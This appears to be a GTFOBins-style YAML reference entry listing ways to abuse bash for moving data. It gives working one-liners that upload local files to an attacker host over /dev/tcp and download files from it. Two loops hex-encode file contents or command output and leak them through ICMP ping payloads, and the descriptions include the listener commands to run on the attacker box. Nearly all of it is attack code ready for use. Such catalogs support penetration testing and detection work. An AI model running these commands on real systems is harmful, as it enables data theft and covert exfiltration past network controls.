---
functions:
  file-upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
            3<>/dev/tcp/$RHOST/$RPORT \
            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 4444 < "file_to_send"` on the attacker box to send the file.
      code: |
        bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  
        
        Send local file content over ICMP using hex-encoded payloads.
      code: |
        hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
        do printf "%02x" "'${line:$i:1}"; done; done < "$LFILE"); i=0;
        while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
        ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        hex=$(cmd="$($CMD)"; while IFS= read -r line; do for ((i=0; i<${#line}; i++));
        do printf "%02x" "'${line:$i:1}"; done; done <<< "$cmd"); i=0;
        while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
        ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
---
